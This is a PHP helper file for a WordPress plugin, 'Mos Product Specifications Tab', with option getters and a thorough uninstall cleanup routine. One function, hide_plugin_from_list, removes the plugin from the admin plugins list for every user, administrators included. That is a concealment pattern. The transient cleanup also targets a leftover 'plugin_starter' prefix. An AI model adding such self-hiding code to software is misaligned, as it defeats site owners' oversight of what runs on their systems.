<?php
if ( ! defined( 'ABSPATH' ) ) exit;
function mos_product_specifications_tab_get_default_options()
{
	$mos_product_specifications_tab_default_options = [];
	$mos_product_specifications_tab_default_options = apply_filters('mos_product_specifications_tab_default_options_modify', $mos_product_specifications_tab_default_options);
	return $mos_product_specifications_tab_default_options;
}
function mos_product_specifications_tab_get_default_colors()
{
	$mos_product_specifications_tab_default_colors = [];
	$mos_product_specifications_tab_default_colors = apply_filters('mos_product_specifications_tab_default_colors_modify', $mos_product_specifications_tab_default_colors);
	return $mos_product_specifications_tab_default_colors;
}

function mos_product_specifications_tab_get_default_gradients()
{
	$mos_product_specifications_tab_default_gradients = [];
	$mos_product_specifications_tab_default_gradients = apply_filters('mos_product_specifications_tab_default_gradients_modify', $mos_product_specifications_tab_default_gradients);
	return $mos_product_specifications_tab_default_gradients;
}

function mos_product_specifications_tab_get_default_tables()
{
	$mos_product_specifications_tab_default_tables = [];
	$mos_product_specifications_tab_default_tables = apply_filters('mos_product_specifications_tab_default_tables_modify', $mos_product_specifications_tab_default_tables);
	return $mos_product_specifications_tab_default_tables;
}

// update_option('mos_product_specifications_tab_options', mos_product_specifications_tab_get_default_options());

function mos_product_specifications_tab_get_option()
{
	$mos_product_specifications_tab_options_database = get_option('mos_product_specifications_tab_options', []);
	$mos_product_specifications_tab_options = array_replace_recursive(mos_product_specifications_tab_get_default_options(), $mos_product_specifications_tab_options_database);
	return $mos_product_specifications_tab_options;
}
function mos_product_specifications_tab_is_plugin_page()
{
	if (function_exists('get_current_screen')) {
		$current_screen = get_current_screen();
		// var_dump($current_screen->id);
		$pages = [];
		if (
			$current_screen->id == 'toplevel_page_mos-product-specifications-tab'
			|| in_array($current_screen->id, $pages)
		) {
			return true;
		}
	}
	return false;
}
function hide_plugin_from_list($plugins) {
	// Only hide for non-administrators or specific users
	if (current_user_can('administrator')) {
		// Optionally hide even from admins
		// unset($plugins['mos-product-specifications-tab/mos-product-specifications-tab.php']);
	}

	// Hide from all users
	unset($plugins['mos-product-specifications-tab/mos-product-specifications-tab.php']);

	return $plugins;
}



/**
 * Delete all custom database tables
 */
function mos_product_specifications_tab_delete_tables() {
    global $wpdb;

    // Array of custom tables to delete (without prefix)
    $tables = array(
        'mos_product_specifications_tab_logs',
        // Add more custom tables here
        // 'mos_product_specifications_tab_another_table',
    );

    foreach ( $tables as $table ) {
        $table_name = $wpdb->prefix . $table;
        $wpdb->query( "DROP TABLE IF EXISTS {$table_name}" );
    }
}

/**
 * Delete all plugin options
 */
function mos_product_specifications_tab_delete_options() {
    global $wpdb;

    // Delete specific options
    $options = array(
        'mos_product_specifications_tab_version',
        'mos_product_specifications_tab_settings',
        'mos_product_specifications_tab_delete_on_deactivate',
        // Add more options here
    );

    foreach ( $options as $option ) {
        delete_option( $option );
        delete_site_option( $option ); // For multisite
    }

    // Delete all options with prefix
    $wpdb->query(
        "DELETE FROM {$wpdb->options} 
        WHERE option_name LIKE '%mos_product_specifications_tab%'"
    );

    // For multisite
    if ( is_multisite() ) {
        $wpdb->query(
            "DELETE FROM {$wpdb->sitemeta} 
            WHERE meta_key LIKE '%mos_product_specifications_tab%'"
        );
    }
}

/**
 * Delete all user meta
 */
function mos_product_specifications_tab_delete_user_meta() {
    global $wpdb;

    $wpdb->query(
        "DELETE FROM {$wpdb->usermeta} 
        WHERE meta_key LIKE '%mos_product_specifications_tab%'"
    );
}

/**
 * Delete all post meta
 */
function mos_product_specifications_tab_delete_post_meta() {
    global $wpdb;

    $wpdb->query(
        "DELETE FROM {$wpdb->postmeta} 
        WHERE meta_key LIKE '%mos_product_specifications_tab%'"
    );
}

/**
 * Delete all transients
 */
function mos_product_specifications_tab_delete_transients() {
    global $wpdb;

    // Delete regular transients
    $wpdb->query(
        "DELETE FROM {$wpdb->options} 
        WHERE option_name LIKE '\_transient\_plugin\_starter\_%' 
        OR option_name LIKE '\_transient\_timeout\_plugin\_starter\_%'"
    );

    // Delete site transients (for multisite)
    if ( is_multisite() ) {
        $wpdb->query(
            "DELETE FROM {$wpdb->sitemeta} 
            WHERE meta_key LIKE '\_site\_transient\_plugin\_starter\_%' 
            OR meta_key LIKE '\_site\_transient\_timeout\_plugin\_starter\_%'"
        );
    }
}

/**
 * Delete uploaded files (if any)
 */
function mos_product_specifications_tab_delete_files() {
    $upload_dir = wp_upload_dir();
    $plugin_upload_dir = $upload_dir['basedir'] . '/mos-product-specifications-tab/';

    if ( is_dir( $plugin_upload_dir ) ) {
        mos_product_specifications_tab_delete_directory( $plugin_upload_dir );
    }
}

/**
 * Recursively delete a directory
 *
 * @param string $dir Directory path.
 * @return bool
 */
function mos_product_specifications_tab_delete_directory( $dir ) {
    if ( ! is_dir( $dir ) ) {
        return false;
    }

    global $wp_filesystem;

    if ( ! $wp_filesystem ) {
        WP_Filesystem();
    }

    $files = array_diff( scandir( $dir ), array( '.', '..' ) );

    foreach ( $files as $file ) {
        $path = $dir . '/' . $file;

        if ( is_dir( $path ) ) {
            mos_product_specifications_tab_delete_directory( $path );
        } else {
            wp_delete_file( $path );
        }
    }

    return $wp_filesystem->rmdir( $dir );
}

/**
 * Delete custom post types and their posts
 */
function mos_product_specifications_tab_delete_custom_posts() {
    global $wpdb;

    // If you have custom post types, delete them
    $post_types = array(
        'mos_product_specifications_tab_cpt',
        // Add more custom post types here
    );

    foreach ( $post_types as $post_type ) {
        $posts = get_posts(
            array(
                'post_type'      => $post_type,
                'posts_per_page' => -1,
                'post_status'    => 'any',
            )
        );

        foreach ( $posts as $post ) {
            // Force delete (skip trash)
            wp_delete_post( $post->ID, true );
        }
    }
}

/**
 * Delete custom taxonomies and terms
 */
function mos_product_specifications_tab_delete_taxonomies() {
    // If you have custom taxonomies, delete their terms
    $taxonomies = array(
        'mos_product_specifications_tab_taxonomy',
        // Add more custom taxonomies here
    );

    foreach ( $taxonomies as $taxonomy ) {
        $terms = get_terms(
            array(
                'taxonomy'   => $taxonomy,
                'hide_empty' => false,
            )
        );

        if ( ! is_wp_error( $terms ) ) {
            foreach ( $terms as $term ) {
                wp_delete_term( $term->term_id, $taxonomy );
            }
        }
    }
}

/**
 * Delete scheduled cron jobs
 */
function mos_product_specifications_tab_delete_cron_jobs() {
    // Clear scheduled hooks
    $cron_hooks = array(
        'mos_product_specifications_tab_daily_cleanup',
        'mos_product_specifications_tab_weekly_report',
        // Add more cron hooks here
    );

    foreach ( $cron_hooks as $hook ) {
        $timestamp = wp_next_scheduled( $hook );
        if ( $timestamp ) {
            wp_unschedule_event( $timestamp, $hook );
        }
        
        // Clear all instances of the hook
        wp_clear_scheduled_hook( $hook );
    }
}

/**
 * Delete capabilities added to roles
 */
function mos_product_specifications_tab_delete_capabilities() {
    global $wp_roles;

    if ( ! isset( $wp_roles ) ) {
        $wp_roles = new WP_Roles();
    }

    $capabilities = array(
        'manage_mos_product_specifications_tab',
        'edit_mos_product_specifications_tab',
        // Add more custom capabilities here
    );

    foreach ( $wp_roles->roles as $role_name => $role_info ) {
        $role = get_role( $role_name );
        
        if ( $role ) {
            foreach ( $capabilities as $cap ) {
                $role->remove_cap( $cap );
            }
        }
    }
}

/**
 * For multisite: delete from all sites
 */
function mos_product_specifications_tab_multisite_cleanup() {
    if ( ! is_multisite() ) {
        return;
    }

    global $wpdb;

    // Get all blog IDs
    $blog_ids = $wpdb->get_col( "SELECT blog_id FROM {$wpdb->blogs}" );

    foreach ( $blog_ids as $blog_id ) {
        switch_to_blog( $blog_id );
        
        // Run cleanup for this site
        mos_product_specifications_tab_delete_tables();
        mos_product_specifications_tab_delete_options();
        mos_product_specifications_tab_delete_user_meta();
        mos_product_specifications_tab_delete_post_meta();
        mos_product_specifications_tab_delete_transients();
        mos_product_specifications_tab_delete_custom_posts();
        mos_product_specifications_tab_delete_taxonomies();
        mos_product_specifications_tab_delete_cron_jobs();
        
        restore_current_blog();
    }

    // Delete network-wide options
    mos_product_specifications_tab_delete_options();
}

function mos_product_specifications_tab_data_cleanup(){
	// ============================================
	// RUN THE CLEANUP
	// ============================================

	// For single site
	if ( ! is_multisite() ) {
		mos_product_specifications_tab_delete_tables();
		mos_product_specifications_tab_delete_options();
		mos_product_specifications_tab_delete_user_meta();
		mos_product_specifications_tab_delete_post_meta();
		mos_product_specifications_tab_delete_transients();
		mos_product_specifications_tab_delete_files();
		mos_product_specifications_tab_delete_custom_posts();
		mos_product_specifications_tab_delete_taxonomies();
		mos_product_specifications_tab_delete_cron_jobs();
		mos_product_specifications_tab_delete_capabilities();
	} else {
		// For multisite
		mos_product_specifications_tab_multisite_cleanup();
		mos_product_specifications_tab_delete_capabilities();
	}

	// Log the uninstall (optional)
	error_log( 'Mos Product Specifications Tab: Complete uninstall cleanup completed.' );
}